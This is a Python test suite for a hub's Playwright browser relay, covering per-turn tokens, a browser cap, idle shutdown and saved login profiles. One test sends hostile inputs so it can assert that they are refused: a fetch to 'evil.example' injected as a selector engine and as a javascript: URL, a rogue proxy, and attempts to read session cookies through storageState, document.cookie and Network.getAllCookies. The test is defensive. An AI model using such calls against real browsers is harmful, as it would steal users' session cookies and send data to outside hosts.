"""The hub's browser route: a token for one turn of one browser-on instance, a relay to the browser
service, a cap on browsers at once, and a service that runs only while it is needed (ADR 0113)."""

import asyncio
import json
from collections.abc import AsyncIterator
from contextlib import asynccontextmanager
from dataclasses import dataclass, field
from pathlib import Path
from uuid import UUID, uuid4

import aiohttp
import pytest
from aiohttp import web

from kinby.contracts import (
    BROWSER_PROFILE_DELETE,
    BROWSER_PROFILE_LIST,
    BROWSER_PROFILE_RENAME,
    INSTANCE_STATUS,
    BrowserProfile,
    BrowserProfileDeleteCommand,
    BrowserProfileListCommand,
    BrowserProfileListResult,
    BrowserProfileRenameCommand,
    ControlToken,
    ErrorCode,
    ErrorEnvelope,
    FrameType,
    InstanceStatusCommand,
    InstanceStatusResult,
)
from kinby.core.contract_server import CONTROL_TOKEN_VARIABLE
from kinby.hub import Hub
from kinby.hub.browser import BrowserLimits
from kinby.hub.browser_service import LAUNCH_OPTIONS
from kinby.instance import Serve
from kinby.plugins.hub import HUB_URL_VARIABLE
from kinby.plugins.playwright_browser import PlaywrightBrowser
from tests.test_hub import FakeRuntime, hub_at, hub_client, started_instance
from tests.test_hub_home_reads import answers
from tests.test_hub_routing import control_token
from tests.test_hub_server import served, url

_PRIVATE_URL = "http://hub:8080"


class FakeBrowserRuntime:
    """A browser service that answers at *address* while it runs."""

    def __init__(self, address: str) -> None:
        self.address = address
        self.starts = 0
        self.stops = 0
        self.stopped = asyncio.Event()
        self.up = False

    async def start(self) -> str:
        self.starts += 1
        self.up = True
        self.stopped.clear()
        return self.address

    async def running(self) -> bool:
        return self.up

    async def stop(self) -> None:
        self.stops += 1
        self.up = False
        self.stopped.set()


_CONTEXT = "browser-context@1"


@dataclass
class FakeService:
    """What a stand-in for Playwright's browser server saw, and the state its contexts hold."""

    connected: list[dict[str, str]] = field(default_factory=list)
    calls: list[dict[str, object]] = field(default_factory=list)
    state: dict[str, object] = field(default_factory=lambda: {"cookies": [], "origins": []})


def _answer(call: dict[str, object], service: FakeService) -> dict[str, object]:
    match call["method"]:
        case "newContext":
            return {"id": call["id"], "result": {"context": {"guid": _CONTEXT}}}
        case "storageState":
            return {"id": call["id"], "result": service.state}
        case _:
            return {"id": call["id"], "result": {}}


@asynccontextmanager
async def playwright_server(service: FakeService) -> AsyncIterator[str]:
    """A stand-in for Playwright's browser server. It answers each protocol call, and records
    the calls and the headers of each connection."""

    async def socket(request: web.Request) -> web.WebSocketResponse:
        service.connected.append(dict(request.headers))
        response = web.WebSocketResponse()
        await response.prepare(request)
        async for message in response:
            call = json.loads(message.data)
            service.calls.append(call)
            await response.send_str(json.dumps(_answer(call, service)))
        return response

    application = web.Application()
    application.router.add_get("/", socket)
    runner = web.AppRunner(application)
    await runner.setup()
    site = web.TCPSite(runner, "127.0.0.1", 0)
    await site.start()
    try:
        yield f"ws://127.0.0.1:{site.port}/"
    finally:
        await runner.cleanup()


@dataclass(frozen=True)
class BrowserHub:
    hub: Hub
    runtime: FakeBrowserRuntime
    service: FakeService
    address: Serve
    alice: UUID
    bob: UUID

    def route(self, instance_id: UUID) -> str:
        return url(self.address, f"/instances/{instance_id}/hub")

    def browser(self, instance_id: UUID) -> str:
        return url(self.address, f"/instances/{instance_id}/browser")

    def token(self, instance_id: UUID) -> ControlToken:
        return control_token(self.hub, str(instance_id))

    async def open(
        self, instance_id: UUID, turn: UUID, profile: str | None = None
    ) -> dict[str, object]:
        return await self.call(
            instance_id, "browser.open", {"turn_id": str(turn), "profile": profile}
        )

    async def call(
        self, instance_id: UUID, method: str, params: dict[str, object]
    ) -> dict[str, object]:
        """Call *method* on the instance's hub route."""
        (answer,) = await answers(
            self.route(instance_id), self.token(instance_id), (method, params)
        )
        return answer


def browser_on(hub: Hub, instance_id: UUID) -> None:
    record = hub.registry.instance(instance_id)
    assert record is not None
    manifest = record.path / "kinby.toml"
    manifest.write_text("browser = true\n" + manifest.read_text(encoding="utf-8"), encoding="utf-8")


@asynccontextmanager
async def browser_hub(directory: Path, limits: BrowserLimits) -> AsyncIterator[BrowserHub]:
    """A served hub whose alice has the browser on, beside bob who does not."""
    service = FakeService()
    async with playwright_server(service) as address:
        runtime = FakeBrowserRuntime(address)
        hub = hub_at(
            directory,
            runtime=FakeRuntime(),
            private_url=_PRIVATE_URL,
            browser=runtime,
            browser_limits=limits,
        )
        client = hub_client(hub)
        alice = (await started_instance(client, hub, name="alice")).instance_id
        bob = (await started_instance(client, hub, name="bob")).instance_id
        browser_on(hub, alice)
        async with served(hub) as served_at:
            yield BrowserHub(hub, runtime, service, served_at, alice, bob)
        hub.close()


def _result(answer: dict[str, object]) -> dict[str, object]:
    assert answer["type"] == FrameType.RESULT.value, answer
    result = answer["result"]
    assert isinstance(result, dict)
    return result


def _error(answer: dict[str, object]) -> dict[str, object]:
    assert answer["type"] == FrameType.ERROR.value, answer
    error = answer["error"]
    assert isinstance(error, dict)
    return error


#: A Playwright client's first call, and what the stand-in service answers it.
_INITIALIZE = {"id": 1, "guid": "", "method": "initialize", "params": {}, "metadata": {}}
_INITIALIZED = {"id": 1, "result": {}}


async def _connects(route: str, token: object) -> int | dict[str, object]:
    """The relayed answer to a client's first call, or the status the route refused the
    connection with."""
    async with aiohttp.ClientSession(headers={"Authorization": f"Bearer {token}"}) as session:
        try:
            async with session.ws_connect(
                route, headers={"x-playwright-browser": "chromium"}
            ) as socket:
                await socket.send_json(_INITIALIZE)
                return json.loads((await socket.receive(timeout=5)).data)
        except aiohttp.WSServerHandshakeError as error:
            return error.status


_LIMITS = BrowserLimits(cap=3, wait_seconds=5, idle_seconds=300, connect_seconds=60)


def test_the_route_issues_a_token_for_one_turn_that_connects_only_its_own_instance(tmp_path):
    async def scenario() -> None:
        async with browser_hub(tmp_path / "hub", _LIMITS) as hub:
            opened = _result(await hub.open(hub.alice, uuid4()))
            token = opened["token"]
            as_bob = await _connects(hub.browser(hub.bob), token)
            as_alice = await _connects(hub.browser(hub.alice), token)
            again = await _connects(hub.browser(hub.alice), token)

        assert opened["address"] == f"ws://hub:8080/instances/{hub.alice}/browser"
        assert as_bob == 401
        assert as_alice == _INITIALIZED
        assert again == 401
        (headers,) = hub.service.connected
        assert headers["x-playwright-launch-options"] == LAUNCH_OPTIONS
        assert headers["x-playwright-browser"] == "chromium"
        assert "Authorization" not in headers

    asyncio.run(scenario())


def test_a_browser_off_instance_is_refused_the_route(tmp_path):
    async def scenario() -> None:
        async with browser_hub(tmp_path / "hub", _LIMITS) as hub:
            refused = _error(await hub.open(hub.bob, uuid4()))

        assert refused["code"] == ErrorCode.NOT_FOUND.value
        assert hub.runtime.starts == 0

    asyncio.run(scenario())


def test_with_the_cap_full_a_request_that_waits_past_its_limit_fails_with_a_clear_error(
    tmp_path, monkeypatch: pytest.MonkeyPatch
):
    limits = BrowserLimits(cap=1, wait_seconds=0.05, idle_seconds=300, connect_seconds=60)

    async def scenario() -> None:
        async with browser_hub(tmp_path / "hub", limits) as hub:
            _result(await hub.open(hub.alice, uuid4()))
            refused = _error(await hub.open(hub.alice, uuid4()))
            monkeypatch.setenv(HUB_URL_VARIABLE, hub.route(hub.alice).replace("http", "ws", 1))
            monkeypatch.setenv(CONTROL_TOKEN_VARIABLE, hub.token(hub.alice))
            with pytest.raises(ValueError, match="cap of 1") as raised:
                await PlaywrightBrowser().open(uuid4())

        assert refused["code"] == ErrorCode.RESOURCE_EXHAUSTED.value
        assert refused["retryable"] is True
        assert refused["message"] == (
            "The hub's browser cap of 1 is reached, and no browser came free within 0.05 "
            "seconds. Try again later."
        )
        assert str(raised.value) == f"The hub refused the browser: {refused['message']}"

    asyncio.run(scenario())


def test_a_token_never_connected_gives_its_browser_back(tmp_path):
    limits = BrowserLimits(cap=1, wait_seconds=5, idle_seconds=300, connect_seconds=0.05)

    async def scenario() -> None:
        async with browser_hub(tmp_path / "hub", limits) as hub:
            first = _result(await hub.open(hub.alice, uuid4()))
            second = _result(await hub.open(hub.alice, uuid4()))
            expired = await _connects(hub.browser(hub.alice), first["token"])

        assert second["token"] != first["token"]
        assert expired == 401

    asyncio.run(scenario())


def test_the_hub_starts_the_service_on_the_first_request_and_stops_it_once_idle(tmp_path):
    limits = BrowserLimits(cap=3, wait_seconds=5, idle_seconds=0.05, connect_seconds=60)

    async def scenario() -> None:
        async with browser_hub(tmp_path / "hub", limits) as hub:
            runtime = hub.runtime
            assert runtime.starts == 0
            first = _result(await hub.open(hub.alice, uuid4()))
            second = _result(await hub.open(hub.alice, uuid4()))
            starts = runtime.starts
            await _connects(hub.browser(hub.alice), first["token"])
            await _connects(hub.browser(hub.alice), second["token"])
            await asyncio.wait_for(runtime.stopped.wait(), timeout=5)
            _result(await hub.open(hub.alice, uuid4()))

        assert starts == 1
        assert runtime.stops == 1
        assert runtime.starts == 2

    asyncio.run(scenario())


def test_a_service_that_died_starts_again_on_the_next_request(tmp_path):
    async def scenario() -> tuple[int, int | dict[str, object]]:
        async with browser_hub(tmp_path / "hub", _LIMITS) as hub:
            _result(await hub.open(hub.alice, uuid4()))
            hub.runtime.up = False
            opened = _result(await hub.open(hub.alice, uuid4()))
            return hub.runtime.starts, await _connects(hub.browser(hub.alice), opened["token"])

    starts, connected = asyncio.run(scenario())

    assert starts == 2
    assert connected == _INITIALIZED


class Turn:
    """A turn's browser, connected through the hub's browser route as a Playwright client is."""

    def __init__(self, socket: aiohttp.ClientWebSocketResponse) -> None:
        self._socket = socket
        self._ids = iter(range(1, 1_000))

    async def call(
        self, guid: str, method: str, params: dict[str, object] | None = None
    ) -> dict[str, object]:
        """Make one protocol call, and return what came back for it."""
        call_id = next(self._ids)
        await self._socket.send_json(
            {"id": call_id, "guid": guid, "method": method, "params": params or {}, "metadata": {}}
        )
        while True:
            answer = json.loads((await self._socket.receive(timeout=5)).data)
            if answer.get("id") == call_id:
                return answer

    async def send_frame(self, frame: str | bytes) -> None:
        """Send *frame* as it is, text or binary."""
        if isinstance(frame, bytes):
            await self._socket.send_bytes(frame)
        else:
            await self._socket.send_str(frame)


@asynccontextmanager
async def turn_browser(
    hub: BrowserHub,
    turn: UUID,
    profile: str | None = None,
    options: dict[str, object] | None = None,
) -> AsyncIterator[Turn]:
    """Open *turn*'s browser on alice's route, and its context with *options*, or as the adapter
    does."""
    token = _result(await hub.open(hub.alice, turn, profile))["token"]
    async with (
        aiohttp.ClientSession(headers={"Authorization": f"Bearer {token}"}) as session,
        session.ws_connect(hub.browser(hub.alice)) as socket,
    ):
        browser = Turn(socket)
        await browser.call("browser@1", "newContext", options or {"selectorEngines": []})
        yield browser


_SIGNED_IN: dict[str, object] = {
    "cookies": [{"name": "session", "value": "alice-1", "domain": "www.linkedin.com", "path": "/"}],
    "origins": [],
}
_REFRESHED: dict[str, object] = {
    "cookies": [{"name": "session", "value": "alice-2", "domain": "www.linkedin.com", "path": "/"}],
    "origins": [],
}


async def _save(hub: BrowserHub, turn: UUID, name: str) -> dict[str, object]:
    return await hub.call(
        hub.alice,
        "browser.profile.save",
        {"turn_id": str(turn), "name": name, "site": "www.linkedin.com"},
    )


def _opened_with(service: FakeService) -> list[object]:
    """The storage state each context the service opened started with."""
    opened_with = []
    for call in service.calls:
        if call["method"] == "newContext":
            params = call["params"]
            assert isinstance(params, dict)
            opened_with.append(params.get("storageState"))
    return opened_with


def test_a_turns_browser_saved_as_a_profile_is_listed_by_name_and_site(tmp_path):
    async def scenario() -> None:
        async with browser_hub(tmp_path / "hub", _LIMITS) as hub:
            hub.service.state = _SIGNED_IN
            turn = uuid4()
            async with turn_browser(hub, turn):
                saved = _result(await _save(hub, turn, "LinkedIn"))
            listed = _result(await hub.call(hub.alice, "browser.profiles", {}))
            as_the_user = await hub_client(hub.hub).call(
                BROWSER_PROFILE_LIST, BrowserProfileListCommand(instance_id=hub.alice)
            )
            bobs = await hub_client(hub.hub).call(
                BROWSER_PROFILE_LIST, BrowserProfileListCommand(instance_id=hub.bob)
            )

        assert saved == {"name": "LinkedIn", "site": "www.linkedin.com"}
        assert listed == {"profiles": [saved]}
        assert as_the_user == BrowserProfileListResult(
            profiles=(BrowserProfile(name="LinkedIn", site="www.linkedin.com"),)
        )
        assert bobs == BrowserProfileListResult(profiles=())

    asyncio.run(scenario())


def test_a_turn_opened_with_a_profile_starts_with_its_state_and_saves_its_state_back(tmp_path):
    async def scenario() -> list[object]:
        async with browser_hub(tmp_path / "hub", _LIMITS) as hub:
            hub.service.state = _SIGNED_IN
            first = uuid4()
            async with turn_browser(hub, first):
                _result(await _save(hub, first, "LinkedIn"))
            async with turn_browser(hub, uuid4(), "LinkedIn") as browser:
                hub.service.state = _REFRESHED
                await browser.call(_CONTEXT, "close")
            async with turn_browser(hub, uuid4(), "LinkedIn"):
                pass
            return _opened_with(hub.service)

    opened_with = asyncio.run(scenario())

    assert opened_with == [None, _SIGNED_IN, _REFRESHED]


def test_a_turn_reaches_its_browser_only_by_the_calls_the_browser_tools_make(tmp_path):
    """Whatever client holds the turn's token, a profile's cookies stay with the hub."""
    hostile_options: dict[str, object] = {
        "selectorEngines": [{"name": "leak", "source": "fetch('https://evil.example/')"}],
        "proxy": {"server": "http://evil.example:8080"},
        "ignoreHTTPSErrors": True,
    }

    async def scenario() -> tuple[list[dict[str, object]], dict[str, object], FakeService]:
        async with browser_hub(tmp_path / "hub", _LIMITS) as hub:
            hub.service.state = _SIGNED_IN
            async with turn_browser(hub, uuid4(), options=hostile_options) as browser:
                refused = [
                    await browser.call(_CONTEXT, "storageState"),
                    await browser.call(_CONTEXT, "cookies"),
                    await browser.call(
                        "frame@1", "evaluateExpression", {"expression": "document.cookie"}
                    ),
                    await browser.call(
                        "cdp-session@1", "send", {"method": "Network.getAllCookies"}
                    ),
                    await browser.call(
                        "frame@1", "goto", {"url": "javascript:fetch('https://evil.example/')"}
                    ),
                    await browser.call("browser@1", "newContext", {"selectorEngines": []}),
                ]
                await browser.send_frame("not a call")
                await browser.send_frame(
                    json.dumps(
                        {"id": 99, "guid": _CONTEXT, "method": "storageState", "params": {}}
                    ).encode()
                )
                allowed = await browser.call(
                    "cdp-session@1", "send", {"method": "Page.startScreencast"}
                )
            return refused, allowed, hub.service

    refused, allowed, service = asyncio.run(scenario())

    assert [answer["error"] for answer in refused] == [
        {"error": {"name": "Error", "message": message}}
        for message in [
            'The hub\'s browser route refuses "storageState".',
            'The hub\'s browser route refuses "cookies".',
            'The hub\'s browser route refuses "evaluateExpression".',
            'The hub\'s browser route refuses the CDP command "Network.getAllCookies".',
            "The browser opens only http and https URLs.",
            "The turn's browser has its context already.",
        ]
    ]
    assert "error" not in allowed
    assert [call["method"] for call in service.calls] == ["newContext", "send"]
    assert service.calls[0]["params"] == {"selectorEngines": []}


def test_opening_a_profile_the_instance_lacks_fails_with_a_clear_error(tmp_path):
    async def scenario() -> dict[str, object]:
        async with browser_hub(tmp_path / "hub", _LIMITS) as hub:
            return _error(await hub.open(hub.alice, uuid4(), "LinkedIn"))

    refused = asyncio.run(scenario())

    assert refused["code"] == ErrorCode.NOT_FOUND.value
    assert refused["message"] == 'The instance has no browser profile named "LinkedIn".'


def test_saving_a_turn_with_no_browser_open_fails(tmp_path):
    async def scenario() -> dict[str, object]:
        async with browser_hub(tmp_path / "hub", _LIMITS) as hub:
            return _error(await _save(hub, uuid4(), "LinkedIn"))

    refused = asyncio.run(scenario())

    assert refused["code"] == ErrorCode.NOT_FOUND.value


def test_a_profile_lives_with_the_hub_and_nothing_of_it_under_the_instance(tmp_path):
    async def scenario() -> tuple[Path, Path]:
        async with browser_hub(tmp_path / "hub", _LIMITS) as hub:
            hub.service.state = _SIGNED_IN
            turn = uuid4()
            async with turn_browser(hub, turn):
                _result(await _save(hub, turn, "LinkedIn"))
            record = hub.hub.registry.instance(hub.alice)
            assert record is not None
            return hub.hub.directory, record.path

    hub_directory, instance_directory = asyncio.run(scenario())

    def holding_the_cookie(directory: Path) -> list[Path]:
        return [
            path
            for path in directory.rglob("*")
            if path.is_file() and b"alice-1" in path.read_bytes()
        ]

    assert holding_the_cookie(instance_directory) == []
    (kept,) = holding_the_cookie(hub_directory)
    assert kept.is_relative_to(hub_directory / "browser-profiles")
    assert not kept.is_relative_to(instance_directory)
    assert kept.stat().st_mode & 0o777 == 0o600


def test_the_user_renames_and_deletes_an_instances_profiles_and_no_other_instances(tmp_path):
    async def scenario() -> list[object]:
        async with browser_hub(tmp_path / "hub", _LIMITS) as hub:
            turn = uuid4()
            async with turn_browser(hub, turn):
                _result(await _save(hub, turn, "LinkedIn"))
            client = hub_client(hub.hub)
            return [
                await client.call(
                    BROWSER_PROFILE_RENAME,
                    BrowserProfileRenameCommand(
                        instance_id=hub.bob, name="LinkedIn", new_name="Work"
                    ),
                ),
                await client.call(
                    BROWSER_PROFILE_DELETE,
                    BrowserProfileDeleteCommand(instance_id=hub.bob, name="LinkedIn"),
                ),
                await client.call(
                    BROWSER_PROFILE_RENAME,
                    BrowserProfileRenameCommand(
                        instance_id=hub.alice, name="LinkedIn", new_name="Work"
                    ),
                ),
                await client.call(
                    BROWSER_PROFILE_DELETE,
                    BrowserProfileDeleteCommand(instance_id=hub.alice, name="Work"),
                ),
            ]

    bobs_rename, bobs_delete, renamed, deleted = asyncio.run(scenario())

    assert isinstance(bobs_rename, ErrorEnvelope)
    assert bobs_rename.code is ErrorCode.NOT_FOUND
    assert isinstance(bobs_delete, ErrorEnvelope)
    assert bobs_delete.code is ErrorCode.NOT_FOUND
    assert renamed == BrowserProfileListResult(
        profiles=(BrowserProfile(name="Work", site="www.linkedin.com"),)
    )
    assert deleted == BrowserProfileListResult(profiles=())


def test_the_status_says_which_instances_open_browsers(tmp_path):
    async def scenario() -> list[object]:
        async with browser_hub(tmp_path / "hub", _LIMITS) as hub:
            client = hub_client(hub.hub)
            return [
                await client.call(INSTANCE_STATUS, InstanceStatusCommand(instance_id=instance))
                for instance in (hub.alice, hub.bob)
            ]

    alice, bob = asyncio.run(scenario())

    assert isinstance(alice, InstanceStatusResult)
    assert isinstance(bob, InstanceStatusResult)
    assert (alice.browser, bob.browser) == (True, False)
